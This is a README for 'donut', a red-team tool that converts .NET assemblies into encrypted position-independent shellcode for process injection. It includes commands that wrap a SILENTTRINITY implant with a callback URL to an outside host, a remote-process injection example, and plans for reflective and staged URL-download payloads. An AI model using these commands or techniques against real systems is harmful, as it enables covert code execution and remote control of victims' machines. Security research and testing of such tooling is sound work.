# donut
Generates position-independant shellcode to bootstrap and load .NET Assemblies.

Usage:

.\donut.exe .\SILENTTRINITY_DLL.dll ST Main http://192.168.197.134:80

Running donut.exe will run the shellcode to test it, so be careful. 

You can test the payload in a remote process by using:

.\inject.exe /pic ./donut.exe64.bin /donut.cfg

How does this work? 

Overall, donut creates position-independant shellcode that loads a .NET Assembly using the Unmanaged CLR Hosting APIs. The .NET Assembly is encrypted using SPECK block cipher in CTR mode. It's very compact and doesn't take up much space but isn't easy to break. When the shellcode executes, it loads the CLR, decrypts the Assembly, loads it into the CLR, and executes the entry point specified by the user. Currently, it can only take on argument, but we are working on fixing that.

The DonutTest project is a C# tester that injects a calc popper into notepad using CreateRemoteThread.

# Project plan

We'll do it in stages to avoid feature creep and allow for iterative development.

1) Create a PIC payload to load an arbitrary .NET Assembly with n arguments. For DLLs, the user should specify the entry point. For EXEs, the PIC should get the Entry Point using Assembly.EntryPoint.
2) Create a C and Python generator for the PIC shellcode payloads.
3) Create reflective DLL injection version that uses a reflective bootstrap DLL (Unmanaged CLR Hosting API) to load the Assembly. Have the generator output both the shellcode and the bootstrap DLL. This is easier for operators to modify and lets them use the DLL for normal reflective DLL injection
4) Created staged versions of both of these payload types that downloads the Assembly from a URL.
5) Document everything so that these techniques are reproducible.
6) Polish the code and interface. Add miscellaneous options as needed.

*NEED TO UPDATE THE STUFF BELOW*

Design:

Microsoft provides an API for loading .NET Assemblies from unmanaged code called the Unmanaged CLR hosting API. It exists to allow developers to build custom loaders, and is how the Windows loader loads .NET EXEs and DLLs.

We use a CLR Hosting loader (based on Casey Smith's) to create an unmanaged DLL with your target Assembly embedded as a resource. This DLL bootstraps your code by loading the Common Language Runtime. It is designed to be loadable through DLLMain and Reflective DLL Injection.

The bootstrap DLL loads its payload from an embedded resource in its PE file. A slightly different version of the DLL is created for x64/x86 and .NET EXEs/DLLs.

The resulting DLL is then converted to position-independant shellcode using an adaptation of sRDI by monoxgas.

Our Python script performs the following logic to create the shellcode payload:

* Determine whether or not your Assembly payload is a DLL or EXE.
* Determine whether to create x86 or x64 shellcode.
* Determine which bootstrap DLL to use based on the information above.
* Replace the default resource in the bootstrap DLL with your payload Assembly and write the resulting DLL to output/payload_name/bootstrap.dll
* (Optional) Strip the PE headers from output/payload_name/bootstrap_stripped.bin
* Use sRDI's library to convert the resulting DLL to shellcode. Output the result to output/payload_name/{x86|x64}shellcode.bin *(We may need to customize this.)*

Usage:

python generator.py [-s] {x86 | x64} {Assembly.exe | Assembly.dll} payload_name

-s      Whether or not to strip headers from the bootstrap DLL.

*-x      Whether or not to XOR encrypt the .NET Assembly with a randomly-generated 256-bit XOR key. (Maybe add when everything else works.)*